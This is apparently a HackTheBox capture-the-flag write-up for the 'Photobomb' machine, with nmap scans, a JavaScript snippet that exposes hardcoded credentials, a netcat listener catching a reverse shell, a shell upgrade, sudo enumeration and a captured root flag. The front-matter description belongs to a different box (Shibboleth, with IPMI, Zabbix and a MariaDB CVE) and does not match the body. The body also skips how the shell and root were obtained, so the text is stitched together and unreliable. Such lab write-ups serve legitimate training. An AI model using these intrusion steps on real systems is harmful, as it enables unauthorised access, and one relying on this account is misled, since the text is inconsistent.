---
layout: post
title: "HTB: PHOTOBOMB (10.10.11.182)"
description: "Shibboleth is a medium machine from HackTheBox created by knightmare & mrb3n. It starts off with a static website template. We will find a clue to look into BMC automation then find IPMI listening on UDP port 632. I will use Metasploit to leak a hash from IPMI, and crack it to get creds. This creds will allow me to log into Zabbix instance. Once in Zabbix i will use the Zabbix agent to execute commands and gain initial foothold. I will use credential reuse to pivots the next user. To get root, I’ll exploit a CVE in MariaDB / MySQL."
tags: [hackthebox, htb, linux, snmp, zabbix, command execution, access control lists, shibboleth, nmap, gobuster, ipimi-svc, mysql, password reuse, CVE-2021-27928,port 623,monitoring]
image: "/assets/img/photobomb/photobomb_feature.png"
---
## RECON
### Nmap

As always we start off with the recon and enumeration process to get an overview of our attack surface and target's running service.

We run NMAP with default scripts and enumerate version and save it in the directory called nmap.

```nmap
# Nmap 7.92 scan initiated Fri Feb 10 12:27:30 2023 as: nmap -p- --min-rate 10000 -oA nmap/allports 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.59s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Fri Feb 10 12:27:43 2023 -- 1 IP address (1 host up) scanned in 12.61 seconds

# Nmap 7.92 scan initiated Fri Feb 10 12:28:24 2023 as: nmap -sC -sV -p 22,80 -oA nmap/photobomb 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb 10 12:28:51 2023 -- 1 IP address (1 host up) scanned in 26.37 seconds
```

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
And we get a shell on the box. While we are at it we can upgrade out shell to a better one

```sh
┌─[george@parrot]─[~/HTB/boxes/photobomb]
└──╼ $nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.15] from (UNKNOWN) [10.10.11.182] 43228
bash: cannot set terminal process group (697): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ 

wizard@photobomb:~/photobomb$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
wizard@photobomb:~/photobomb$ ^Z
[1]+  Stopped                 nc -lvnp 9001
┌─[✗]─[george@parrot]─[~/HTB/boxes/photobomb]
└──╼ $stty raw -echo;fg
nc -lvnp 9001

wizard@photobomb:~/photobomb$
```

Lets see what are our sudo permissions 

```sh
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
Looking at the file we have read permissions 

```sh
wizard@photobomb:~/photobomb$ ls -l /opt/cleanup.sh
-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh

wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
```sh
root@photobomb:~# cat root.txt
6e1520841af265a0b4670439d183a254
```
